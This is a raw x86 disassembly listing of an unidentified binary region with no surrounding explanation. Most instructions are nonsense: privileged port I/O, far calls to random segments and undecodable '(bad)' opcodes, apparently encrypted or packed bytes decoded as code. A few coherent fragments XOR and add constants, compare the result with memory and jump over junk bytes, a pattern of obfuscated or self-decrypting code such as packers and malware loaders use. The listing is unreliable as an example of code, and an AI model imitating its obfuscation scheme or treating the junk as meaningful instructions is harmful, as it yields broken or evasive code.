  40bf1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf1f:	xchg   edi,eax
  40bf20:	mov    dh,0x79
  40bf22:	imul   cl
  40bf24:	outs   dx,BYTE PTR ds:[esi]
  40bf25:	je     0x40bf8b
  40bf27:	jmp    edx
  40bf29:	jns    0x40beec
  40bf2b:	ret    
  40bf2c:	rcl    BYTE PTR [edi+0x3cb94fe5],cl
  40bf32:	imul   edi,DWORD PTR ds:0x53edfd80,0x56bbaca8
  40bf3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf3d:	xor    al,0xea
  40bf3f:	pop    edi
  40bf40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf41:	sti    
  40bf42:	arpl   WORD PTR [ebp+0x65a16461],ax
  40bf48:	xor    DWORD PTR [ebx-0x24],0x3092a250
  40bf4f:	ins    DWORD PTR es:[edi],dx
  40bf50:	out    0x40,eax
  40bf52:	out    dx,eax
  40bf53:	les    edx,FWORD PTR [esi]
  40bf55:	call   0xb0c9:0x86797721
  40bf5c:	jp     0x40bf28
  40bf5e:	jge    0x40bf47
  40bf60:	icebp  
  40bf61:	and    al,0xcc
  40bf63:	and    BYTE PTR [edi],dl
  40bf65:	gs inc ebp
  40bf67:	arpl   WORD PTR [ebx-0x9db468e],bx
  40bf6d:	jp     0x40bf60
  40bf6f:	ja     0x40bef3
  40bf71:	sub    DWORD PTR [eax+edi*4],ebp
  40bf74:	push   ecx
  40bf75:	add    al,0x39
  40bf77:	cwde   
  40bf78:	inc    eax
  40bf79:	push   eax
  40bf7a:	(bad)  
  40bf7b:	push   ss
  40bf7c:	lods   eax,DWORD PTR ds:[esi]
  40bf7d:	fwait
  40bf7e:	jo     0x40bf6f
  40bf80:	leave  
  40bf81:	push   edx
  40bf82:	retf   
  40bf83:	cmc    
  40bf84:	mov    edi,DWORD PTR [ebp+0x8]
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	xchg   BYTE PTR [ebx+0x12],dh
  40bfc0:	xor    edi,DWORD PTR [esi]
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	dec    ebx
  40bfca:	ds in  al,0x80
  40bfcd:	enter  0x81e2,0x1e
  40bfd1:	add    DWORD PTR [ecx-0x5c],ebx
  40bfd4:	jge    0x40bfdc
  40bfd6:	ror    ch,0x18
  40bfd9:	rol    BYTE PTR ds:0xe030649b,cl
  40bfdf:	scas   eax,DWORD PTR es:[edi]
  40bfe0:	loope  0x40c047
  40bfe2:	mov    ds:0xa7cae9e0,eax
  40bfe7:	xchg   ebx,eax
  40bfe8:	pusha  
  40bfe9:	jge    0x40c02a
  40bfeb:	fldcw  WORD PTR [eax-0x11]
  40bfee:	add    DWORD PTR [edx-0x7f66d39a],ecx
  40bff4:	fisub  DWORD PTR [ecx+0x48b3b26f]
  40bffa:	sub    cl,ch
  40bffc:	or     eax,0x2994de49
  40c001:	pop    ss
  40c002:	iret   
  40c003:	cmp    al,al
  40c005:	jnp    0x40bfbc
  40c007:	xor    WORD PTR [esi+0x296e4cbd],ax
  40c00e:	push   ebx
  40c00f:	sbb    al,0x78
  40c011:	je     0x40c015
  40c013:	es cli 
  40c015:	jp     0x40c052
  40c017:	retw   
  40c019:	out    0xa8,al
  40c01b:	test   BYTE PTR [edi-0x1a],0x9a
  40c01f:	xchg   BYTE PTR [esi-0x6a],dl
  40c022:	call   0xbfa5d52b
  40c027:	mov    edi,0xf1afc4a1
  40c02c:	dec    ebx
  40c02d:	out    dx,al
  40c02e:	dec    edi
  40c02f:	div    bl
  40c031:	stos   DWORD PTR es:[edi],eax
  40c032:	pop    ecx
  40c033:	jp     0x40c027
  40c035:	pusha  
  40c036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c037:	pop    ebp
  40c038:	fbstp  TBYTE PTR [eax]
  40c03a:	pop    edx
  40c03b:	push   0xafb3bbb8
  40c040:	fs loope 0x40c083
  40c043:	gs jno 0x40bfe8
  40c046:	mov    eax,0x90ba0b81
  40c04b:	xchg   ebx,eax
  40c04c:	pop    esi
  40c04d:	les    edx,FWORD PTR [eax+0x7b]
  40c050:	ja     0x40c050
  40c052:	inc    esi
  40c053:	push   0x5b
  40c055:	cmp    ah,BYTE PTR [eax-0x6dd56db3]
  40c05b:	xchg   edx,eax
  40c05c:	xor    edx,DWORD PTR [eax+0x23]
  40c05f:	push   esi
  40c060:	std    
  40c061:	scas   eax,DWORD PTR es:[edi]
  40c062:	hlt    
  40c063:	mov    ah,0xcd
  40c065:	push   edx
  40c066:	sub    al,0x15
  40c068:	or     dh,ch
  40c06a:	sar    BYTE PTR [eax],cl
  40c06c:	and    al,0xf0
  40c06e:	mov    al,0x7f
  40c070:	fs sbb al,0x4b
  40c073:	imul   esi,DWORD PTR [ebx],0x36c6e714
  40c079:	dec    eax
  40c07a:	push   ebx
  40c07b:	call   0xc9bfff54
  40c080:	sbb    DWORD PTR ds:0x7cdc8715,edi
  40c086:	loope  0x40c028
  40c088:	adc    eax,DWORD PTR [esi+ecx*1]
  40c08b:	push   ds
  40c08c:	pop    ecx
  40c08d:	push   esi
  40c08e:	dec    ebx
  40c08f:	push   edi
  40c090:	lods   eax,DWORD PTR ds:[esi]
  40c091:	inc    ebx
  40c092:	je     0x40c0bb
  40c094:	retf   0x38c7
  40c097:	pop    eax
  40c098:	sub    al,0x1e
  40c09a:	adc    DWORD PTR [ecx+0x33],ebx
  40c09d:	dec    BYTE PTR [eax]
  40c09f:	adc    DWORD PTR [ebx],0x74
  40c0a2:	inc    esp
  40c0a3:	pusha  
  40c0a4:	lahf   
  40c0a5:	add    BYTE PTR [edx],ch
  40c0a7:	retf   
  40c0a8:	xchg   ebp,eax
  40c0a9:	adc    BYTE PTR [ebx],0x88
  40c0ac:	and    eax,0xbad2bc2c
  40c0b1:	sub    eax,DWORD PTR [edx]
  40c0b3:	adc    al,0xf8
  40c0b5:	or     al,0xed
  40c0b7:	stc    
  40c0b8:	shl    DWORD PTR [ebp+ebp*8-0x6f],1
  40c0bc:	jmp    0x93fd:0x3d2d8fc0
  40c0c3:	push   ebx
  40c0c4:	lahf   
  40c0c5:	sbb    DWORD PTR [edi+0x2a],ebp
  40c0c8:	(bad)  
  40c0ca:	or     BYTE PTR [edi],0x79
  40c0cd:	(bad)  
  40c0ce:	jmp    0x99709ee3
  40c0d3:	or     eax,0xc86db2f4
  40c0d8:	pop    eax
  40c0d9:	adc    bl,BYTE PTR [ebx]
  40c0db:	imul   edx,DWORD PTR [edx],0x60d35860
  40c0e1:	aad    0x48
  40c0e3:	imul   ecx,ebx,0x3a
  40c0e6:	rcr    BYTE PTR [ecx+0x33],0x5
  40c0ea:	outs   dx,BYTE PTR ds:[esi]
  40c0eb:	push   es
  40c0ec:	push   ecx
  40c0ed:	pop    ecx
  40c0ee:	ja     0x40c108
  40c0f0:	pop    esp
  40c0f1:	and    bh,BYTE PTR [esi]
  40c0f3:	xor    ah,BYTE PTR [eax]
  40c0f5:	(bad)  
  40c0f6:	aam    0x9e
  40c0f8:	mov    esi,0x9fa47629
  40c0fd:	rcr    dh,1
  40c0ff:	xchg   ebp,eax
  40c100:	push   esp
  40c101:	and    al,0x41
  40c103:	push   ebx
  40c104:	inc    esi
  40c105:	inc    ecx
  40c106:	nop
  40c107:	pop    ecx
  40c108:	pop    edx
  40c109:	mov    dl,0x6f
  40c10b:	inc    edx
  40c10c:	add    eax,0x82186be2
  40c111:	iret   
  40c112:	in     al,0xb
  40c114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c115:	(bad)  [ebp+0x39f7ea52]
  40c11b:	fisttp QWORD PTR [ebx]
  40c11d:	dec    edx
  40c11e:	sub    dh,BYTE PTR [edi-0x7fdb2bb6]
  40c124:	cmp    edx,DWORD PTR [ebp+ebp*1-0x39]
  40c128:	std    
  40c129:	dec    esi
  40c12a:	inc    edi
  40c12b:	jns    0x40c0be
  40c12d:	push   ebp
  40c12e:	jp     0x40c110
  40c130:	push   ds
  40c131:	pusha  
  40c132:	mov    edi,0xd466e1bd
  40c137:	push   ecx
  40c138:	clc    
  40c139:	fild   DWORD PTR [ecx+0x11]
  40c13c:	daa    
  40c13d:	xor    BYTE PTR [ecx+0x2c],bh
  40c140:	std    
  40c141:	int    0x48
  40c143:	push   esi
  40c144:	mov    edx,0x806dbcb7
  40c149:	jns    0x40c1c6
  40c14b:	mov    cs,WORD PTR [ebp+0x12a45c58]
  40c151:	outs   dx,DWORD PTR ds:[esi]
  40c152:	cmp    al,0x78
  40c154:	or     dl,BYTE PTR [ebx]
  40c156:	dec    ebx
  40c157:	or     al,0x80
  40c159:	in     eax,dx
  40c15a:	repz mov eax,ds:0x4eeaf8aa
  40c160:	bound  edi,QWORD PTR [esi-0x4ab7f8ce]
  40c166:	cwde   
  40c167:	jns    0x40c1a5
  40c169:	arpl   di,sp
  40c16b:	call   0x4f65:0x599c1528
  40c172:	js     0x40c17e
  40c174:	arpl   WORD PTR [ecx-0x597ef3ee],di
  40c17a:	ins    DWORD PTR es:[edi],dx
  40c17b:	ror    BYTE PTR [ebx],0x41
  40c17e:	jbe    0x40c1e7
  40c180:	arpl   sp,bx
  40c182:	mov    ah,BYTE PTR [ebp-0x54]
  40c185:	(bad)
  40c188:	add    DWORD PTR [ebx],esp
  40c18a:	enter  0x4bc7,0x1b
  40c18e:	push   0x76
  40c190:	pop    edi
  40c191:	jbe    0x40c1bf
  40c193:	sub    al,0x61
  40c195:	pop    ecx
  40c196:	adc    dl,ah
  40c198:	rcr    ebx,1
  40c19a:	push   DWORD PTR [edi-0x740c3f65]
  40c1a0:	test   eax,0x98f7dfa6
  40c1a5:	sub    al,0x2
  40c1a7:	leave  
  40c1a8:	push   ebp
  40c1a9:	xchg   edi,eax
  40c1aa:	stc    
  40c1ab:	sar    al,cl
  40c1ad:	adc    DWORD PTR [ecx-0x2fdd6be],ebp
  40c1b3:	ficom  WORD PTR [edx-0x29]
  40c1b6:	out    dx,eax
  40c1b7:	mov    edi,0xab42e067
  40c1bc:	mov    dh,BYTE PTR [edi]
  40c1be:	dec    eax
  40c1bf:	test   cl,0x57
  40c1c2:	inc    ecx
  40c1c3:	jg     0x40c1ac
  40c1c5:	icebp  
  40c1c6:	retf   
  40c1c7:	sub    DWORD PTR [ebx+0x23],esi
  40c1ca:	xchg   esi,eax
  40c1cb:	leave  
  40c1cc:	xor    DWORD PTR [edi-0x50c6f69e],0x0
  40c1d3:	mov    esp,0x9ade55a
  40c1d8:	outs   dx,BYTE PTR ds:[esi]
  40c1d9:	imul   DWORD PTR [edx+0x53]
  40c1dc:	mov    bl,0x11
  40c1de:	clc    
  40c1df:	sub    al,0xb6
  40c1e1:	pop    edi
  40c1e2:	xchg   edi,eax
  40c1e3:	aaa    
  40c1e4:	cmp    al,0xa2
  40c1e6:	adc    eax,0x85f4778e
  40c1eb:	das    
  40c1ec:	jg     0x40c1c4
  40c1ee:	pop    es
  40c1ef:	test   al,0xba
  40c1f1:	sub    ebx,DWORD PTR [ecx]
  40c1f3:	jno    0x40c1c8
  40c1f5:	xchg   ebx,eax
  40c1f6:	fwait
  40c1f7:	xlat   BYTE PTR ds:[ebx]
  40c1f8:	xor    BYTE PTR [eax-0x6a84a323],ch
  40c1fe:	mov    edx,0xdad10a2a
  40c204:	sbb    al,0xf2
  40c206:	fld    QWORD PTR [edi+ebp*4-0xc]
  40c20a:	stos   DWORD PTR es:[edi],eax
  40c20b:	xchg   esp,esi
  40c20d:	fs call 0x78e66341
  40c213:	xor    eax,0x39a1579c
  40c218:	clc    
  40c219:	in     eax,0x2b
  40c21b:	xor    al,0x75
  40c21d:	push   es
  40c21e:	out    0xac,al
  40c220:	jp     0x40c227
  40c222:	cs jmp 0x40c1df
  40c225:	jno    0x40c2a3
  40c227:	ret    
  40c228:	mov    al,ds:0xf969a42a
  40c22d:	stc    
  40c22e:	and    dh,BYTE PTR [edi-0x3953c95a]
  40c234:	cmc    
  40c235:	arpl   WORD PTR [eax+0x628e5467],cx
  40c23b:	sbb    dl,dl
  40c23d:	repz loop 0x40c271
  40c240:	hlt    
  40c241:	cdq    
  40c242:	cmp    eax,0x1bf89dfb
  40c247:	xor    esi,DWORD PTR [ebx-0x2bb5fd]
  40c24d:	push   ecx
  40c24e:	pop    eax
  40c24f:	dec    ebp
  40c250:	mov    esp,0x352da668
  40c255:	test   DWORD PTR [eax+0x33],ecx
  40c258:	imul   ecx,DWORD PTR [edi],0x315dd334
  40c25e:	mov    DWORD PTR [edi-0x34c1b1ac],esp
  40c264:	xchg   edi,eax
  40c265:	inc    eax
  40c266:	out    0xce,eax
  40c268:	or     DWORD PTR [edi-0x40],edx
  40c26b:	mov    ah,BYTE PTR [eax]
  40c26d:	mov    dl,0x6f
  40c26f:	sub    edi,DWORD PTR [ebp-0x71]
  40c272:	(bad)  
  40c273:	sub    dl,BYTE PTR [ecx+0x69d10079]
  40c279:	dec    edi
  40c27a:	add    dh,BYTE PTR es:[ebx+eiz*2+0x4c]
  40c27f:	js     0x40c283
  40c281:	xchg   edx,eax
  40c282:	hlt    
  40c283:	leave  
  40c284:	jle    0x40c286
  40c286:	das    
  40c287:	jnp    0x40c2a2
  40c289:	xchg   esi,eax
  40c28a:	js     0x40c2d2
  40c28c:	sub    eax,0xa899310c
  40c291:	inc    eax
  40c292:	xchg   edx,edi
  40c294:	xchg   bx,ax
  40c296:	inc    ebx
  40c297:	test   DWORD PTR [esi],ebp
  40c299:	dec    edi
  40c29a:	popf   
  40c29b:	pavgw  mm6,QWORD PTR [eax+0x76e99335]
  40c2a2:	fs ds jb 0x40c2c6
  40c2a6:	xor    BYTE PTR cs:[esi+0x7de2f818],bl
  40c2ad:	mov    al,0xc6
  40c2af:	push   esp
  40c2b0:	push   0x8381563a
  40c2b5:	sbb    ecx,DWORD PTR [edx]
  40c2b7:	idiv   BYTE PTR [ebx+0x42]
  40c2ba:	std    
  40c2bb:	mov    eax,ds:0x9343d031
  40c2c0:	jecxz  0x40c255
  40c2c2:	add    eax,0x458b6f40
  40c2c7:	fsub   DWORD PTR [esi-0x75]
  40c2ca:	jge    0x40c2a0
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax+0x4d],bh
  40c2e3:	in     al,0x19
  40c2e5:	les    edi,FWORD PTR [edx]
  40c2e7:	fwait
  40c2e8:	js     0x40c362
  40c2ea:	je     0x40c36a
  40c2ec:	js     0x40c366
  40c2ee:	ss test ebx,edx
  40c2f1:	or     ebx,ecx
  40c2f3:	push   ebp
  40c2f4:	repz xor DWORD PTR [edx+0x4898e96c],edx
  40c2fb:	push   ebp
  40c2fc:	inc    ebx
  40c2fd:	pmullw mm7,mm6
  40c300:	lods   eax,DWORD PTR ds:[esi]
  40c301:	jmp    0x4970:0x384e5a6b
  40c308:	mov    esi,0x4d6ad366
  40c30d:	(bad)  
  40c30f:	jl     0x40c352
  40c311:	and    BYTE PTR [esi+0x3ff295aa],bh
  40c317:	xchg   ebp,eax
  40c318:	repnz cmp eax,0x5aeeaba8
  40c31e:	mov    fs,esp
  40c320:	aam    0x10
  40c322:	imul   eax,DWORD PTR [esi+0x68bfdba9],0xffffff9c
  40c329:	jp     0x40c372
  40c32b:	test   BYTE PTR [eax-0x61],cl
  40c32e:	ret    
  40c32f:	imul   esp,DWORD PTR ds:[edi-0x6a2488fa],0x53
  40c337:	xlat   BYTE PTR ds:[ebx]
  40c338:	pop    ebx
  40c339:	test   eax,0x19a7b4df
  40c33e:	adc    cl,al
  40c340:	jge    0x40c307
  40c342:	inc    edx
  40c343:	mov    eax,0x352f34b0
  40c348:	jnp    0x40c379
  40c34a:	pusha  
  40c34b:	aaa    
  40c34c:	rep lods eax,DWORD PTR ds:[esi]
  40c34e:	ds sub al,0x95
  40c351:	xchg   DWORD PTR [esi+0x31409f98],edi
  40c357:	fisub  DWORD PTR [esi-0xfeef656]
  40c35d:	push   cs
  40c35e:	pop    edx
  40c35f:	fwait
  40c360:	xor    al,0x9e
  40c362:	fnstenv ss:[eax+edx*4+0x3b9a63e8]
  40c36a:	les    ecx,FWORD PTR [ebp+0x48]
  40c36d:	cmp    eax,0x3156cdec
  40c372:	and    DWORD PTR [eax],ebx
  40c374:	adc    dh,dh
  40c376:	cmp    ebp,DWORD PTR ds:0xe45cef58
  40c37c:	je     0x40c3e5
  40c37e:	stos   DWORD PTR es:[edi],eax
  40c37f:	push   cs
  40c380:	push   edx
  40c381:	dec    ebx
  40c382:	and    eax,DWORD PTR [ebx-0x1e]
  40c385:	sub    bh,ah
  40c387:	jb     0x40c3cd
  40c389:	sbb    eax,0x1e751121
  40c38e:	inc    edi
  40c38f:	xor    bh,BYTE PTR [esi]
  40c391:	into   
  40c392:	or     eax,DWORD PTR ds:0xcbd19d39
  40c398:	ret    
  40c399:	mov    ecx,0xaa87f594
  40c39e:	ds cs loopne 0x40c3cb
  40c3a2:	jg     0x40c38d
  40c3a4:	shr    BYTE PTR [edx-0x13],1
  40c3a7:	dec    ecx
  40c3a8:	xor    cl,ch
  40c3aa:	clc    
  40c3ab:	test   eax,0x1e49e74
  40c3b0:	or     cl,BYTE PTR [esi+0x1e]
  40c3b3:	and    edx,DWORD PTR [ecx]
  40c3b5:	dec    edi
  40c3b6:	repz inc edi
  40c3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3b9:	fcomp  QWORD PTR [esi-0x58]
  40c3bc:	add    esp,DWORD PTR ds:0xbacef2ba
  40c3c2:	out    dx,al
  40c3c3:	js     0x40c40d
  40c3c5:	out    0x5e,al
  40c3c7:	shl    dh,1
  40c3c9:	in     al,0x19
  40c3cb:	mov    DWORD PTR [eax-0x6630f62f],edx
  40c3d1:	loope  0x40c374
  40c3d3:	(bad)  
  40c3d4:	xor    dx,ax
  40c3d7:	das    
  40c3d8:	add    ebx,DWORD PTR [edx+ecx*2-0x59ab5113]
  40c3df:	mov    bl,BYTE PTR [ebx]
  40c3e1:	mov    bh,0xe3
  40c3e3:	mov    al,BYTE PTR [edi+0x1fb5c980]
  40c3e9:	add    edx,edx
  40c3eb:	ins    DWORD PTR es:[edi],dx
  40c3ec:	fcmovnb st,st(6)
  40c3ee:	jne    0x40c3ab
  40c3f0:	or     edi,DWORD PTR [edx-0x1c]
  40c3f3:	aam    0x8a
  40c3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f6:	js     0x40c40d
  40c3f8:	dec    esi
  40c3f9:	mov    fs,WORD PTR [ebx]
  40c3fb:	mov    ecx,0x1d9c1365
  40c400:	pop    ds
  40c401:	or     dh,BYTE PTR [edx]
  40c403:	cli    
  40c404:	jecxz  0x40c461
  40c406:	(bad)  
  40c407:	loope  0x40c3bd
  40c409:	in     eax,dx
  40c40a:	and    ebx,0x36
  40c40d:	add    al,0xa3
  40c40f:	and    BYTE PTR [ecx],cl
  40c411:	add    BYTE PTR [eax],dl
  40c413:	not    DWORD PTR [ebx]
  40c415:	mov    fs,WORD PTR [ecx]
  40c417:	(bad)  
  40c418:	or     edi,ebx
  40c41a:	cld    
  40c41b:	xlat   BYTE PTR ds:[ebx]
  40c41c:	mov    edx,0x5fb27c5c
  40c421:	xchg   edi,eax
  40c422:	jne    0x40c409
  40c424:	mul    BYTE PTR ds:0x5ae68083
  40c42a:	pop    ecx
  40c42b:	mov    BYTE PTR [ebp+ebp*2-0x40],dh
  40c42f:	dec    ebp
  40c431:	mov    al,BYTE PTR [ebp-0x58]
  40c434:	lods   eax,DWORD PTR ds:[esi]
  40c435:	sbb    al,0xec
  40c437:	push   ss
  40c438:	mov    ebx,0xbc89e571
  40c43d:	jb     0x40c3f8
  40c43f:	les    esi,FWORD PTR [ecx-0x1955679c]
  40c445:	mov    ds:0xcc7826d,al
  40c44a:	mov    ch,0x1e
  40c44c:	jnp    0x40c3fa
  40c44e:	mov    eax,ds:0x890d6b0d
  40c453:	repz in eax,0xcd
  40c456:	test   BYTE PTR [ebp-0x8],al
  40c459:	out    dx,eax
  40c45a:	mov    gs,WORD PTR [edi+0x22fc6e30]
  40c460:	pop    ebx
  40c461:	scas   al,BYTE PTR es:[edi]
  40c462:	ds es xchg esi,eax
  40c465:	inc    edi
  40c466:	icebp  
  40c467:	sti    
  40c468:	test   DWORD PTR [ebx-0x57],0x6527bee0
  40c46f:	jmp    0xbd2885ad
  40c474:	fcom   DWORD PTR [eax+0x37]
  40c477:	add    eax,0x199e54
  40c47c:	push   cs
  40c47d:	cmc    
  40c47e:	shr    DWORD PTR [eax],1
  40c480:	and    ebx,edx
  40c482:	mov    ebx,DWORD PTR [ebx-0x4d]
  40c485:	mov    bl,0xb6
  40c487:	fisubr WORD PTR [esi-0x22870ead]
  40c48d:	jecxz  0x40c43b
  40c48f:	shr    BYTE PTR [edi-0x4d],0x96
  40c493:	push   edx
  40c494:	push   ebp
  40c495:	or     DWORD PTR ss:[esi+0x7b4c24b],ecx
  40c49c:	jmp    0x528fac03
  40c4a1:	in     eax,0xd4
  40c4a3:	xchg   ecx,eax
  40c4a4:	xlat   BYTE PTR ds:[ebx]
  40c4a5:	call   0x94b7:0x5eaf02c
  40c4ac:	xlat   BYTE PTR ds:[ebx]
  40c4ad:	add    al,0x32
  40c4af:	mov    ebp,0xe71a1f2
  40c4b4:	jmp    DWORD PTR [esi-0x71]
  40c4b7:	or     DWORD PTR [ecx+0x25a2317],edi
  40c4bd:	ds and eax,0xa5180c2a
  40c4c3:	add    DWORD PTR [esi+0x5f],ebx
  40c4c6:	push   edx
  40c4c7:	clc    
  40c4c8:	pop    ss
  40c4c9:	sub    edx,ebx
  40c4cb:	xor    eax,0x4c49304c
  40c4d0:	scas   al,BYTE PTR es:[edi]
  40c4d1:	dec    ebx
  40c4d2:	and    ebp,DWORD PTR [edi+ebp*1]
  40c4d5:	jle    0x40c547
  40c4d7:	loop   0x40c4f5
  40c4d9:	pusha  
  40c4da:	jle    0x40c528
  40c4dc:	cs loopne 0x40c4e2
  40c4df:	int    0x4b
  40c4e1:	pusha  
  40c4e2:	cmc    
  40c4e3:	xchg   edx,eax
  40c4e4:	cld    
  40c4e5:	mov    edi,0x80cb6f40
  40c4ea:	xchg   edx,eax
  40c4eb:	scas   al,BYTE PTR es:[edi]
  40c4ec:	cmp    al,0xd
  40c4ee:	and    al,0x7
  40c4f0:	fwait
  40c4f1:	test   ebx,esi
  40c4f3:	lahf   
  40c4f4:	dec    edx
  40c4f5:	push   0xb6e635a4
  40c4fa:	jno    0x40c54e
  40c4fc:	adc    esp,DWORD PTR [edx+0x21]
  40c4ff:	xlat   BYTE PTR ds:[ebx]
  40c500:	jnp    0x40c4c3
  40c502:	mov    edx,0x879a87d0
  40c507:	ret    
  40c508:	or     eax,0xb50cab84
  40c50d:	add    al,0xd7
  40c50f:	push   es
  40c510:	and    edi,DWORD PTR [ecx+0x703ba5e0]
  40c516:	xchg   esi,eax
  40c517:	and    bl,BYTE PTR [ecx+0x10]
  40c51a:	push   edi
  40c51b:	mov    ds:0x9785ecbf,al
  40c520:	fadd   DWORD PTR [esi]
  40c522:	rcl    esp,1
  40c524:	or     ah,BYTE PTR [edx]
  40c526:	icebp  
  40c527:	mov    ds:0x8faeff1d,al
  40c52c:	pop    ds
  40c52d:	int    0x8b
  40c52f:	std    
  40c530:	aas    
  40c531:	push   cs
  40c532:	in     eax,dx
  40c533:	popf   
  40c534:	std    
  40c535:	cli    
  40c536:	push   ebx
  40c537:	hlt    
  40c538:	in     eax,0x4b
  40c53a:	in     eax,dx
  40c53b:	sti    
  40c53c:	sbb    eax,0x8324fcdc
  40c541:	lods   eax,DWORD PTR ds:[esi]
  40c542:	xchg   esp,eax
  40c543:	fsubr  st(6),st
  40c545:	sub    eax,0xc3621530
  40c54a:	jno    0x40c59d
  40c54c:	popa   
  40c54d:	and    BYTE PTR [edi-0x48a94ac2],0xd6
  40c554:	cmp    esi,DWORD PTR [edi+0x1d]
  40c557:	mov    edx,0x30b9c948
  40c55c:	sbb    eax,0x35b16ee4
  40c561:	sti    
  40c562:	(bad)  
  40c563:	call   0x6390:0xdcc4bd83
  40c56a:	fcomp  QWORD PTR [ebp+0x589b4bce]
  40c570:	jne    0x40c539
  40c572:	cwde   
  40c573:	push   ebp
  40c574:	imul   eax,DWORD PTR [ecx-0x41fd268e],0xffffff82
  40c57b:	nop
  40c57c:	stos   BYTE PTR es:[edi],al
  40c57d:	or     al,0xf3
  40c57f:	or     edx,DWORD PTR [eax-0x6]
  40c582:	sbb    DWORD PTR [eax],edx
  40c584:	mov    eax,0x21147842
  40c589:	in     eax,0x34
  40c58b:	lods   eax,DWORD PTR ds:[esi]
  40c58c:	xchg   ebp,eax
  40c58d:	ins    BYTE PTR es:[edi],dx
  40c58e:	icebp  
  40c58f:	xor    edx,DWORD PTR [eax]
  40c591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c592:	in     al,0xe
  40c594:	and    eax,0xb03ac743
  40c599:	cwde   
  40c59a:	jmp    0xd1b5:0x9c642d31
  40c5a1:	sbb    bl,0x64
  40c5a4:	jp     0x40c559
  40c5a6:	sub    DWORD PTR [ebp-0x48],0x47
  40c5aa:	(bad)  
  40c5ac:	adc    al,0x2b
  40c5ae:	in     eax,dx
  40c5af:	dec    eax
  40c5b0:	pop    DWORD PTR [eax+ebp*8]
  40c5b3:	enter  0x88e9,0xf5
  40c5b7:	outs   dx,DWORD PTR ds:[esi]
  40c5b8:	mov    dh,0x6b
  40c5ba:	xchg   ecx,eax
  40c5bb:	cmp    al,0xc2
  40c5bd:	lods   al,BYTE PTR ds:[esi]
  40c5be:	mov    ebx,0x81094db0
  40c5c3:	push   ss
  40c5c4:	ret    
  40c5c5:	mov    DWORD PTR [ecx],edx
  40c5c7:	jae    0x40c5b3
  40c5c9:	iret   
  40c5ca:	or     dh,BYTE PTR [ecx+0x41]
  40c5cd:	jmp    0x40c578
  40c5cf:	mov    bh,0x36
  40c5d1:	std    
  40c5d2:	je     0x18291680
  40c5d8:	int3   
  40c5d9:	push   ss
  40c5da:	xor    ebp,DWORD PTR [edx]
  40c5dc:	(bad)  
  40c5dd:	sub    eax,0x732480a6
  40c5e2:	jo     0x40c592
  40c5e4:	adc    eax,DWORD PTR [eax]
  40c5e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5e7:	std    
  40c5e8:	loop   0x40c5af
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0xad2d2f7
  40c613:	xchg   esi,eax
  40c614:	fild   WORD PTR [edx+0x36]
  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	xor    DWORD PTR [ebp+ebx*2-0x7a530ae3],0x5e
  40c626:	ficom  WORD PTR [ebx]
  40c628:	fcomp  DWORD PTR [ebx+0x13]
  40c62b:	inc    ebp
  40c62c:	mov    cl,0xcc
  40c62e:	js     0x40c5f2
  40c630:	mov    al,0x32
  40c632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c633:	aaa    
  40c634:	pop    edx
  40c635:	jl     0x40c603
  40c637:	jle    0x40c657
  40c639:	xor    ch,dl
  40c63b:	fsub   QWORD PTR [ebp+0x78742c3e]
  40c641:	mov    esi,0x737beb79
  40c646:	push   es
  40c647:	repz push ebx
  40c649:	pop    ds
  40c64a:	sahf   
  40c64b:	imul   ebp,DWORD PTR [edx+0x54e002ad],0x20d8381d
  40c655:	cmp    BYTE PTR [edx-0x1a],0xbf
  40c659:	fsub   st,st(7)
  40c65b:	xchg   ebx,eax
  40c65c:	into   
  40c65d:	jmp    0xecbf5ee1
  40c662:	jne    0x40c6c8
  40c664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c665:	pushf  
  40c666:	stc    
  40c667:	xor    al,0xb3
  40c669:	fld    DWORD PTR [eax+0x51]
  40c66c:	cdq    
  40c66d:	mov    esi,0x177a6e7d
  40c672:	mov    ds:0xb1e09cee,eax
  40c677:	cmp    DWORD PTR [esi],edi
  40c679:	mov    edx,0xfac3ffd1
  40c67e:	jne    0x40c67f
  40c680:	test   DWORD PTR [ecx-0x7d],0x4ff35df8
  40c687:	fwait
  40c688:	and    eax,0x8a43d904
  40c68d:	test   BYTE PTR [eax-0x7e],dh
  40c690:	inc    esp
